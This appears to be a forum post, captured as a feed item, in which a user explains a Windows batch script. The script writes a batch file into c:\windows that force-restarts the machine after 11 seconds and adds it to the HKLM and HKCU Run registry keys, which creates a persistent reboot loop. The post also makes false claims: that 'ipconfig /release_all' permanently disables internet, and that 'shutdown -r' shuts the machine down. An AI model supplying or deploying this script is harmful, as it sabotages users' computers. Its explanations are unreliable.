item.title: SYI request
item.dc:creator: @Syrillia Syrillia
item.description:
@Syrillia wrote:

Well, if you were to punch IPconfig /release into cmd, it would disable your internet, but you could just connect again. If you were to put ipconfig /release_all, it would disable it permanently. As for the other lines, I’m not entirely sure. I’ve never had to work with registry adding before, since I only program compilers. I imagine, looking at it, that it renews ‘ipconfig /release_all’ every time windows it booted.

edit Here’s the other.

echo @echo off>c:\windows\hartlell.bat
echo break off>>c:\windows\hartlell.bat
echo shutdown -r -t 11 -f>>c:\windows\hartlell.bat
echo end>>c:\windows\hartlell.bat
reg add hkey_local_machine\software\microsoft\windows\currentversion\run /v startAPI /t reg_sz /d c:\windows\hartlell.bat /f
reg add hkey_current_user\software\microsoft\windows\currentversion\run /v HAHAHA /t reg_sz /d c:\windows\hartlell.bat /f
PAUSE

This does the same as the other, but instead of running ipconfig /release_all everytime windows is booted, it runs ‘shutdown -r -t 11 -f’, in other words, it shuts it down.
